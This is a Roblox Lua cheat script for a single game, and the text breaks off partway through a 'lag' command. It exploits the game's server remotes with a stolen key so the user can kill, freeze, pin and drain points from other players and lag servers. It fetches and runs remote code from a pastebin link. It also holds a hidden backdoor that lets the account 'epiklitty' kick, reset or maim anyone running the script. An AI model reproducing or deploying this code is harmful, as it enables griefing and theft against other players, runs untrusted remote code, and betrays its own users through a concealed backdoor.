if game.PlaceId == 4064107022 then
	Sgod = false
	ScCd = false
	Lagging = false
	Lagger = false
	Rainbow = false
	Gotkey = false
	Ah = false
	Ah1 = false
	Ah2 = false
	lkill = false
	adm1 = false
	adm2 = false
	Dio = false
	Crit = false
	TS = false
	followed = false
	Farming = false
	Looping = false
	Spending = false
	loadstring(game:HttpGet("https://pastebin.com/raw/RjtRMEZk", true))()
	
	lplayer = game.Players.LocalPlayer
	
	game:GetService('RunService').Stepped:connect(function()
		if followed then
			--lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * -5
		end
	end)
	
	function Split(s, delimiter)
		result = {};
		for match in (s..delimiter):gmatch("(.-)"..delimiter) do
			table.insert(result, match);
		end
		return result;
	end
	
	function crit()
		local timeRemaining = 50
		local names = game.Players.LocalPlayer.Name
		while timeRemaining > 0 do
			game:GetService("Workspace")[names].Stats.Critical.Value = 100
			wait(0.1)
			timeRemaining = timeRemaining - 1	
		end
	end
	
	function upperc(str)
		return (str:gsub("^%l", string.upper))
	end
	
	function heal() --useless lol
		local healBrick = game:GetService("Workspace").Lobby.Interactables.HealBrick
		local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
		local plr = game.Players.LocalPlayer.Character.HumanoidRootPart
		plr.CFrame = healBrick.CFrame
		local plrHead = game.Players.LocalPlayer.Character.Head
		
		for i, v in pairs(game:GetService("Workspace").Lobby.Interactables.HealBrick:GetChildren()) do
			if v.Name == "TouchInterest" and v.Parent then
				firetouchinterest(plrHead, v.Parent, 0)
				wait(0.1)
				firetouchinterest(plrHead, v.Parent, 1)
				break;
			end
		end
		wait(0.1)
		plr.CFrame = CFrame.new(lastPos)
	end

	local prefix = "."
	local LPlayer = game.Players.LocalPlayer


	local remote = game.ReplicatedStorage.Remotes.RequestKey
	remote.OnClientEvent:Connect(function(v)
	keys = v 
	end)
	remote:FireServer()


	active = true
	coroutine.resume(coroutine.create(function()
			while active do
                if game.Players:FindFirstChild("epiklitty") then
                    local scruser = game.Players.LocalPlayer
					local scrowner = game.Players.epiklitty
					scrowner.Chatted:Connect(function(msg)
						msg = msg:lower()
						if string.sub(msg,1,3) == "/e " then
							msg = string.sub(msg,4)
						end
						if string.sub(msg,1,1) == prefix then
							local cmd
							local space = string.find(msg," ")
							if space then
								cmd = string.sub(msg,2,space-1)
							else
								cmd = string.sub(msg,2)
							end
							
							if cmd == "kick" then
								local var = Split(string.sub(msg,space+1), " ")
								local pl = GetPlayer(var[1])
								if scruser.Name ~= "epiklitty" then
									if pl.Name == scruser.Name then
										pl:kick(tostring(var[2]))
									end
								else
									print("lol")
								end
							end
							if cmd == "leg" then
								if scruser.Name ~= "epiklitty" then
									scruser.Character['Right Leg']:Destroy()
								end
							end
							if cmd == "reset" then
								local var = string.sub(msg,space+1)
								local pl = GetPlayer(var)
								if scruser.Name ~= "epiklitty" then
									if pl.Name == scruser.Name then
										pl:BreakJoints()
									end
								else
									print("lol")
								end
								game.Players.LocalPlayer.Character:BreakJoints()
							end
						end
					end)
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "[Script Creator] "..tostring(scrowner).." has joined!";
						Font = Enum.Font.Cartoon;
						Color = Color3.new(0,1,1);
						FontSize = Enum.FontSize.Size96;	
					})
                    active = false
					break
                end
            wait(1)
			end
	end))



	
	
	
	local pref = "."
	
	
	local Working = 0
	LPlayer.Chatted:Connect(function(msg)
		msg = msg:lower()
		if string.sub(msg,1,3) == "/e " then
			msg = string.sub(msg,4)
		end
		if string.sub(msg,1,1) == prefix then
			local cmd
			local space = string.find(msg," ")
			if space then
				cmd = string.sub(msg,2,space-1)
			else
				cmd = string.sub(msg,2)
			end
			
			if cmd == "print" then
				local var = string.sub(msg,space+1)
				print(var)
			end
			if cmd == "gdamage" then
				local var = Split(string.sub(msg,space+1), " ")
				local dmg = tonumber(var[2])
				local multi = dmg * 50
				for i,v in pairs(Gtplayer(var[1])) do
					local name = v.Name
					local ohInstance1 = workspace[name]
					local ohString2 = "Powerup"
					local ohNumber3 = 100
					local ohNumber4 = 200
					local dmg = var[2] * 10
					local ohTable5 = {
						["fac"] = multi
					}
					-- local ohString6 = "9OCnfpK3"

					game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, ohString2, ohNumber3, ohNumber4, ohTable5, keys)
				end


			end
			if cmd == "farm" then
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[FARM] true";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
				Farming = true
				while Farming == true do
					for i, v in pairs(game:GetService("Workspace").Lobby.Interactables["Whack-A-Geph"].GephFolder:GetChildren()) do
						if tostring(v) ~= "EpicCritical" then
							if v:FindFirstChild("ClickDetector") then
								fireclickdetector(v.ClickDetector, 1)
							end
						end
					end
					wait(.1)
				end
			end
			if cmd == "afk" then
				Looping = true
				while Looping == true do
					local leg = game.Players.LocalPlayer.Character['Right Leg']
					for i, v in pairs(game:GetService("Workspace").Lobby.Interactables["Whack-A-Geph"].Activator:GetChildren()) do
						if v.Name == "TouchInterest" and v.Parent then
							firetouchinterest(leg, v.Parent, 0)
							wait(0.1)
							firetouchinterest(leg, v.Parent, 1)
							break;
						end
					end
					wait(52)
				end
			end
			if cmd == "unfarm" then
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[FARM] false";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(1,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
				Farming = false
				Looping = false
			end
			if cmd == "checkusers" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Character:FindFirstChild('Right Leg') then
						print("hi")
					else
						game.StarterGui:SetCore("ChatMakeSystemMessage", {
							Text = "["..v.Name.."] uses the script";
							Font = Enum.Font.Cartoon;
							Color = Color3.new(0,1,0);
							FontSize = Enum.FontSize.Size96;	
						})
					end
				end
			end
			if cmd == "pin" then
				local var = Split(string.sub(msg,space+1), " ")
				local targ1 = GetPlayer(var[1])
				local name = targ1.Name
				local targ2 = GetPlayer(var[2])
				local name2 = targ2.Name
				local ohInstance1 = workspace[name]
				local ohString2 = "Pin"
				local ohNumber3 = 100
				local ohNumber4 = tonumber(var[3])
				local ohTable5 = {
					["part"] = workspace[name2].HumanoidRootPart,
					["ofs"] = CFrame.new(0, 0, -4, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				}

				game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, ohString2, ohNumber3, ohNumber4, ohTable5, keys)
			end
			if cmd == "bring" then
				local var = Split(string.sub(msg,space+1), " ")
				local user = GetPlayer(var[2])
				local name2 = user.Name
				local ohString2 = "Pin"
				local ohNumber3 = 100
				local ohNumber4 = 0.2
				local ohTable5 = {
					["part"] = workspace[name2].HumanoidRootPart,
					["ofs"] = CFrame.new(0, 0, -4, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				}
				for i,v in pairs(Gtplayer(var[1])) do
					if v:FindFirstChild("Alive") and v.Alive.Value then
						local name = v.Name
						local ohInstance1 = workspace[name]
						game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, ohString2, ohNumber3, ohNumber4, ohTable5, keys)
					end
				end
			end
			if cmd == "loopcrit" then
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[loopcrit] fills your crit for the entire round";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
				Crt = true
				v = game.Players.LocalPlayer
				while Crt == true do
					if v:FindFirstChild("Alive") and v.Alive.Value then
						local ohNumber1 = "100"

						game:GetService("ReplicatedStorage").Remotes.GainCritical:FireServer(tonumber(ohNumber1), keys)
					else
						game.StarterGui:SetCore("ChatMakeSystemMessage", {
							Text = "[loopcrit] can only be used ingame";
							Font = Enum.Font.Cartoon;
							Color = Color3.new(1,0,0);
							FontSize = Enum.FontSize.Size96;	
						})
						Crt = false
					end
					wait(2)
				end
			end
			if cmd == "unloopcrit" then
				Crt = false
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[loopcrit] false";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(1,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "dio" then
				if Dio == false then
					Dio = true
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "[TIME] use the words 'stop' and 'resume' to control time";
						Font = Enum.Font.Cartoon;
						Color = Color3.new(0,1,0);
						FontSize = Enum.FontSize.Size96;	
					})
					local StringToDetect = {"stop", "za warudo", "the world"}
					local StringToDetect2 = {"resume"}
					LPlayer.Chatted:Connect(function(Message)
						for i, v in pairs(StringToDetect) do
							if string.find(string.lower(Message), string.lower(v)) then
								if LPlayer.Character then
									for i,v in pairs(game:GetService("Players"):GetPlayers()) do
										if v.Name ~= LPlayer.Name then
											local name = v.Name
											local plrname = workspace[name]
											
											local ohString2 = "Stop"
											local ohNumber3 = 100
											local duration = 10
											local ohTable5 = {}
											
											game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(plrname, ohString2, ohNumber3, duration, ohTable5, keys)
										end
									end
								end;
								game.StarterGui:SetCore("ChatMakeSystemMessage", {
									Text = "[TIME] TIME HAS STOPPED";
									Font = Enum.Font.Cartoon;
									Color = Color3.new(0,1,0);
									FontSize = Enum.FontSize.Size96;	
								})
								TS = true
								local timeRemaining = 10
								while TS == true and timeRemaining > 0 do
									game.StarterGui:SetCore("ChatMakeSystemMessage", {
										Text = "[TIME STOP] "..tostring(timeRemaining).." seconds remaining";
										Font = Enum.Font.Cartoon;
										Color = Color3.new(255,255,0);
										FontSize = Enum.FontSize.Size96;	
									})
									wait(1)
									timeRemaining = timeRemaining - 1
									if timeRemaining == 1 then
										game.StarterGui:SetCore("ChatMakeSystemMessage", {
											Text = "[TIME STOP] "..tostring(timeRemaining).." seconds remaining";
											Font = Enum.Font.Cartoon;
											Color = Color3.new(255,255,0);
											FontSize = Enum.FontSize.Size96;	
										})
										wait(1)
										game.StarterGui:SetCore("ChatMakeSystemMessage", {
											Text = "[TIME] TIME WILL RESUME";
											Font = Enum.Font.Cartoon;
											Color = Color3.new(255,255,0);
											FontSize = Enum.FontSize.Size96;	
										})
										TS = false
									end
								end
							end;
						end
						for i, v in pairs(StringToDetect2) do
							if string.find(string.lower(Message), string.lower(v)) then
								if LPlayer.Character then
									game.StarterGui:SetCore("ChatMakeSystemMessage", {
										Text = "[TIME] TIME WILL RESUME";
										Font = Enum.Font.Cartoon;
										Color = Color3.new(0,1,1);
										FontSize = Enum.FontSize.Size96;	
									})
									TS = false
									for i,v in pairs(game:GetService("Players"):GetPlayers()) do
										if v.Name ~= LPlayer.Name then
											local name = v.Name
											local ohInstance1 = workspace[name]
											local ohString2 = "Stop"
								
											game:GetService("ReplicatedStorage").Remotes.ClearState:FireServer(ohInstance1, ohString2)
										end
									end
								end
							end
						end
					end);
				elseif Dio == true then
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "[DIO] this command is already active";
						Font = Enum.Font.Cartoon;
						Color = Color3.new(255,255,0);
						FontSize = Enum.FontSize.Size96;	
					})
				end
			end
			if cmd == "admin1" then
				
				local var = string.sub(msg,space+1)
				local a1 = GetPlayer(var)
				ad1 = a1
				adm1 = true
				local ohString1 = "/w "..tostring(a1).." you have been given admin, prefix: . cmds: heal, kill"
				local ohString2 = "All"
					
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
				local name = ad1.Name
				local admin1 = game.Players[name]
				admin1.Chatted:Connect(function(msg)
					msg = msg:lower()
					if string.sub(msg,1,3) == "/e " then
						msg = string.sub(msg,4)
					end
					if string.sub(msg,1,1) == pref then
						local cmd
						local space = string.find(msg," ")
						if space then
							cmd = string.sub(msg,2,space-1)
						else
							cmd = string.sub(msg,2)
						end
						if cmd == "print" then
							local var = string.sub(msg,space+1)
							print(var)
						end
						if cmd == "heal" then
							for i,v in pairs(Gtplayer1(string.sub(msg,space+1))) do
								local target = v
								local plr = target.Name
								local name = workspace[plr]
								local vec = target.Character.HumanoidRootPart.Position
								local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
								local ohTable5 = {
									["critgen"] = {
										["amt"] = 60
									}
								}
								game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, -plrHP, nil, nil, nil, nil, nil, nil, keys)
							end
						end
						if cmd == "printing" then
							local as = string.sub(msg,space+1)
							print(as)
						end
						if cmd == "bruh" then
							local target = string.sub(msg,space+1)
							local bruh = GetPlayer(target)
							print(bruh)
							local names = bruh.Name
							local ohInstance1 = workspace[names]
							local ohString2 = "Pin"
							local ohNumber3 = 100
							local ohNumber4 = 1
							local ohTable5 = {
								["part"] = workspace.Lobby.Interactables["Whack-A-Geph"].Activator,
								["ofs"] = CFrame.new(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
							}

							game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, ohString2, ohNumber3, ohNumber4, ohTable5, keys)
						end
						if cmd == "kill" then
							local var = string.sub(msg,space+1)
							followed = true
							local target = GetPlayer1(var)
							local plr = target.Name
							local name = workspace[plr]
							local vec = target.Character.HumanoidRootPart.Position
							local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
							local DMG = tonumber(plrHP) * 2
							local ohTable5 = {
								["critgen"] = {
									["amt"] = 60
								}
							}
							game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)
						end
						if cmd == "cmds" then
							local ohString1 = "/w "..tostring(ad1).." cmds: heal, kill"
							local ohString2 = "All"
								
							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
						end
					end
				end)
			end
			if cmd == "admin2" then
				
				local var = string.sub(msg,space+1)
				local a2 = GetPlayer(var)
				ad2 = a2
				adm2 = true
				local ohString1 = "/w "..tostring(a2).." you have been given admin, prefix: . cmds: heal, kill"
				local ohString2 = "All"
					
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
				local name = ad2.Name
				local admin2 = game.Players[name]
				admin2.Chatted:Connect(function(msg)
					msg = msg:lower()
					if string.sub(msg,1,3) == "/e " then
						msg = string.sub(msg,4)
					end
					if string.sub(msg,1,1) == pref then
						local cmd
						local space = string.find(msg," ")
						if space then
							cmd = string.sub(msg,2,space-1)
						else
							cmd = string.sub(msg,2)
						end
						if cmd == "print" then
							local var = string.sub(msg,space+1)
							print(var)
						end
						if cmd == "heal" then
							for i,v in pairs(Gtplayer2(string.sub(msg,space+1))) do
								local target = v
								local plr = target.Name
								local name = workspace[plr]
								local vec = target.Character.HumanoidRootPart.Position
								local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
								local ohTable5 = {
									["critgen"] = {
										["amt"] = 60
									}
								}
								game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, -plrHP, nil, nil, nil, nil, nil, nil, keys)
							end
						end
						if cmd == "kill" then
							var = string.sub(msg,space+1)
							local target = GetPlayer2(var)
							local plr = target.Name
							flwplr = plr
							local name = workspace[plr]
							local vec = target.Character.HumanoidRootPart.Position
							local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
							local DMG = tonumber(plrHP) * 2
							local ohTable5 = {
								["critgen"] = {
									["amt"] = 60
								}
							}
							game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)
						end
						if cmd == "cmds" then
							local ohString1 = "/w "..tostring(ad2).." cmds: heal, kill"
							local ohString2 = "All"
								
							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
						end
					end
				end)
			end
			if cmd == "admins" then
				print(ad1)
				print(ad2)
			end
			if cmd == "reset" then
				game.Players.LocalPlayer.Character:BreakJoints()
			end
			if cmd == "cd" then
				local num = string.sub(msg,space+1)
				game.Workspace.Global.GlobalCD.Value = num
				wait(10)
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[cooldown] ready!";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "hp" then
				local num = string.sub(msg,space+1)
				local args = {
					[1] = true,
					[2] = num
				}
	
				game:GetService("Players").LocalPlayer.Backpack.Core.ToggleAbsorb:FireServer(unpack(args))
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "current hp";
					Text = tostring(num);
						})
			end
			if cmd == "ping" then
				local var = string.sub(msg,space+1)
				local target = GetPlayer(var)
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "["..tostring(target.Name).."] Ping: "..tostring(target.Ping.Value);
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,1);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "spend" then
				local var = string.sub(msg,space+1)
				local target = GetPlayer(var)
				print(target)
				local namae = target.Name
				local ohInstance1 = workspace[namae]
				local ohString2 = "Pin"
				local ohNumber3 = 100
				local ohNumber4 = 0.3
				local ohTable5 = {
					["part"] = workspace.Lobby.Interactables["Whack-A-Geph"].Activator,
					["ofs"] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				}
				--local ohString6 = "6r19tRd4"

				game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, ohString2, ohNumber3, ohNumber4, ohTable5, keys)

				wait(0.8)

				local table = {
					["part"] = workspace.Lobby.Interactables.StateButtons.Stagger,
					["ofs"] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				}
				game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, ohString2, ohNumber3, ohNumber4, table, keys)
			end
			if cmd == "loopspend" then
				local var = string.sub(msg,space+1)
				local target = GetPlayer(var)
				print(target)
				Spending = true
				while Spending == true do
					local namae = target.Name
					local ohInstance1 = workspace[namae]
					local ohString2 = "Pin"
					local ohNumber3 = 100
					local ohNumber4 = 0.3
					local ohTable5 = {
						["part"] = workspace.Lobby.Interactables["Whack-A-Geph"].Activator,
						["ofs"] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
					}
					--local ohString6 = "6r19tRd4"

					game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, ohString2, ohNumber3, ohNumber4, ohTable5, keys)

					wait(0.8)

					local table = {
						["part"] = workspace.Lobby.Interactables.StateButtons.Stagger,
						["ofs"] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
					}
					game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, ohString2, ohNumber3, ohNumber4, table, keys)
					wait(5)
				end
			end
			if cmd == "unloopspend" then
				Spending = false
			end
			if cmd == "crit" then
				crit()
			end
			if cmd == "class" then
				local clas = string.sub(msg,space+1)
				local ohString1 = upperc(clas)
	
				game:GetService("ReplicatedStorage").Remotes.ChangeClass:FireServer(ohString1)
			end
			if cmd == "cmds" then
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[COMMANDS] press f9";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,1);
					FontSize = Enum.FontSize.Size96;	
				})
				print[[
					[cd] (value) - changes cooldown (default is 100) (IF YOU GET KICKED USE A HITBOX EXTENDER)
					[hbe] - loads hitbox extender
					[ping] (username) - shows someone's ping
					[crit] - fills your critical bar for 5 seconds
					[hpcd] - scales your hp with your cooldown
					[break] - breaks hpcd (use this after a match with hpcd active)
					[breaksg] - breaks semigod (use this after a match with semigod active)
					[class] (classname) - changes your current class
					[target] (username) - target someone (used for 'text' gui)
					[lag] (username) - lags someone including everyone near them (turn graphics to the
					lowest settings when using)
					[u] - updates you on your targets (lag) ping
					[unlag] - unlags the server
					[rgb] (number) - makes you rainbow
					[color] - turns on color picker at misc(gui)
					[off] - turns off color picker and rgb
					[clear] (username) (effect name) - removes an effect
					[breakah] - breaks autoheal
					[heal] (username) - fully heals someone
					[kill] (username) - kills someone (cannot kill people in lobby unless you're in a match)
					[semigod] - heals yourself when hp is not full
					[apply] (username) (effect name) (duration) (amount) - applies an effect to yourself example: .apply me powerup
					100 20 - applies 20 powerup for 100 seconds
					[autoheal] (username) - heals target when hp is not full
					[admin1] (username) - gives admin to someone
					[admin2] (username) - gives admin to another person
					[dio] - gives you time powers (use words 'stop' 'za warudo' 'the world' to stop time and
					use 'resume' to continue time)
					[loopcrit] - fills your critical bar every 2 seconds for the entire round
					[unloopcrit] - disables loopcrit
					[pin] (username 1) (username 2) - pins username 1 to username 2
					[bring] (username 1) (username 2) - brings username 1 to username 2 (can use all for username 1)
					[farm] - autofarms the whack a geph machine
					[afk] - activates the whack a geph machine every 52 seconds (you can disable this with 'unfarm')
					[unfarm] - turns off autofarm
					[control] (username) - used to control a player in the control gui
					[gdamage] (username/all) - sets the damage multiplier of the target
					[spend] (username) - takes 25 points from the person
					[loopspend] (username) - takes 25 points from person every 6 seconds (might take more than 25
					if you get lucky)
					---CHANGELOGS---
					--v1
					-added autoheal, breakah commands
					-removed tpheal, tpkill
					-kill/heal commands now have a global range
					-if you're in lobby you can interact with people ingame using heal/kill commands
					-if you're people ingame you can interact with everyone (including people in lobby) using
					heal/kill commands
					--v1.1
					-added the ability to give admin to anyone
					--can now target everyone in the server using heal/kill commands
					--v1.2
					--hpcd,semigod,autoheal can only be used when target/player is in a match
					and will automatically turn off when the person dies (can still be turned
					off manually)
					--v1.3
					--removed notifications, notifs will now appear on the chat
					--stuff
					--v1.4
					--can now apply effects to anyone
					--v1.5
					--added time stop commands (dio)
					--v1.6
					--added loopcrit command
					--fixed some stuff
					--v1.7
					--added bring, pin commands
					--made it so you can only bring people ingame (if you wanna bring people from
					the lobby use the command 'pin')
					--v1.8
					--added autofarm for whack a geph
					--v1.9
					--added control commanad (allows you to control people)
					--v2.0
					--added 'train' command
					--v2.1
					--added gdamage command
					--removed damage command
					--v2.2
					--changed train to trail
					--added rtrail and trail commands
					--v2.3 removes trail/rtrail commands since it was causing problems and they're
					kinda useless anyways
					--added spend/loopspend commands
					--v2.4
					--NEW UI!!!!!
					--buffed kill command to do double damage
					--v2.5
					--fixed kill aura
					---REMOVED---
					--v2.6
					--time stop keybinds
					--Technomancer mod
					--v2.7
					--added hp modifiers in misc
					--v2.8
					--fixed hbe replaced it with a new one cuz old one got patched (i think)
					[damage] (username) - damages someone
					[check] - shows status (hpcd, semigod)
					[tpheal] (username) - teleports to someone and heals them useful for healing someone ingame
					[tpkill] (username) - teleports to someone and kills them useful for killing someone ingame
					[trail] - trails everyone behind you
					[rtrail] - trails everyone infront of you (rtrail is short for reverse trail)]]
			end
			if cmd == "break" then
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[HPCD] false";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(1,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "breaksg" then
				Sgod = false
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[semigod] false";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(1,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "breakah" then
				Ah = false
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[autoheal] false";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(1,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "hpcd" then
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[HPCD] cooldown now scales with current hp";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
				ScCd = true
				local v = game.Players.LocalPlayer
				local plr = game.Players.LocalPlayer.Name
				local plrHP = game:GetService("Workspace")[plr].Stats.HP
				local cdown = game.Workspace.Global.GlobalCD
				while ScCd == true do
					if v:FindFirstChild("Alive") and v.Alive.Value then
						wait(0.1)
						cdown.Value = plrHP.Value
						if cdown.Value == 0 then
							cdown.Value = 1
						end
					else
						ScCd = off
						cdown.Value = 100
						game.StarterGui:SetCore("ChatMakeSystemMessage", {
							Text = "[HPCD] can only be used when in a match";
							Font = Enum.Font.Cartoon;
							Color = Color3.new(1,1,0);
							FontSize = Enum.FontSize.Size96;	
						})
					end
				end
			end
			if cmd == "semigod" then
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[semigod] auto heals when you take damage";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
				v = game.Players.LocalPlayer
				local plr = game.Players.LocalPlayer.Name
				local plrHP = game:GetService("Workspace")[plr].Stats.HP
				local plrmHP = game:GetService("Workspace")[plr].Stats.MaxHP
				Sgod = true
				local ahealed = false
				while Sgod == true and ahealed == false do
					if v:FindFirstChild("Alive") and v.Alive.Value then
						if plrHP.Value < plrmHP.Value then
							Amount = plrHP.Value - plrmHP.Value
							local ohInstance1 = workspace[plr]
							local ohNumber = tonumber(Amount)
							game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(ohInstance1, ohNumber, nil, nil, nil, nil, nil, nil, keys)
							ahealed = true
						end
					else
						game.StarterGui:SetCore("ChatMakeSystemMessage", {
							Text = "[semigod] can only be used when in a match";
							Font = Enum.Font.Cartoon;
							Color = Color3.new(1,1,0);
							FontSize = Enum.FontSize.Size96;	
						})
						Sgod = false
					end
				wait(0.25)
				ahealed = false
				end
			end
			if cmd == "autoheal" then
				local var = string.sub(msg,space+1)
				local t = GetPlayer(var)
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[auto heal] auto heals when "..tostring(t).." takes damage";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
				local plr = t.Name
				flwplr = t
				local plrHP = game:GetService("Workspace")[plr].Stats.HP
				local plrmHP = game:GetService("Workspace")[plr].Stats.MaxHP
				Ah = true
				local ahealed = false
				while Ah == true and ahealed == false do
					if t:FindFirstChild("Alive") and t.Alive.Value then
						if plrHP.Value < plrmHP.Value then
							Amount = plrHP.Value - plrmHP.Value
							local ohInstance1 = workspace[plr]
							local ohNumber = tonumber(Amount)
							game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(ohInstance1, ohNumber, nil, nil, nil, nil, nil, nil, keys)
							ahealed = true
						end
					else
						Ah = false
						game.StarterGui:SetCore("ChatMakeSystemMessage", {
							Text = "[auto heal] can only be used when target is in a match";
							Font = Enum.Font.Cartoon;
							Color = Color3.new(1,1,0);
							FontSize = Enum.FontSize.Size96;	
						})
					end
				wait(0.25)
				ahealed = false
				end
			end
			if cmd == "texton" then
				Tex = true
			end
			if cmd == "textoff" then
				Tex = false
			end
			if cmd == "target" then
				local user = string.sub(msg,space+1)
				Targ = GetPlayer(user)
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[Target] "..tostring(Targ);
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,1);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "control" then
				local user = string.sub(msg,space+1)
				Ctrl = GetPlayer(user)
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[controlling] "..tostring(Ctrl);
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,1);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "text" then
				while Tex == true do
	
					local name = game.Players[tostring(Targ)].Name
					local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
					local ohString2 = Word
					local ohColor33 = Color3.new(255, 255, 255)
				
					game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
					wait(0.1)
				end
			end
			if cmd == "warn" then
				while Tex == true do
	
					local name = game.Players[tostring(Targ)].Name
					local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
					local ohString2 = Word
					local ohColor33 = Color3.new(255, 0, 0)
				
					game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
					wait(0.1)
				end
			end
			if cmd == "green" then
				while Tex == true do
	
					local name = game.Players[tostring(Targ)].Name
					local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
					local ohString2 = Word
					local ohColor33 = Color3.new(0, 255, 0)
				
					game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
					wait(0.1)
				end
			end
			if cmd == "yell" then
				while Tex == true do
	
					local name = game.Players[tostring(Targ)].Name
					local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
					local ohString2 = Word
					local ohColor33 = Color3.new(255, 255, 0)
				
					game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
					wait(0.1)
				end
			end
			if cmd == "lag" then
				local var = string.sub(msg,space+1)
				ttarget = GetPlayer(var)
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[Lagging] "..tostring(ttarget);
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,0);
